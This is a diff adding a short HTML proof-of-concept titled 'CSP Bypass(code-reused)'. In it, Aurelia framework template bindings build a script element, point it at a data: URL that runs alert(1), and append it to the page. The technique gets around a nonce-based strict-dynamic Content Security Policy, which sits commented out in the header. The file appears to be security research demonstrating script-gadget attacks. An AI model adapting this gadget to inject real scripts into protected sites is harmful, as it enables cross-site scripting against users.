@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="object-src 'none'; script-src 'nonce-random' 'strict-dynamic' https: http:;"> -->
+</head>
+
+<body aurelia-app="main">
+        <script nonce=random src="scripts/vendor-bundle.js" data-main="aurelia-bootstrapper"></script>
+    <!-- payload -->
+    <div ref=me 
+    s.bind="$this.me.ownerDocument.createElement('script')" 
+    data-bar="${$this.me.s.src='data:,alert(1)'}" 
+    data-foobar="${$this.me.ownerDocument.body.appendChild($this.me.s)}"></div>
+
+    <!-- end -->
+    
+</body>
+</body>
+
+</html>
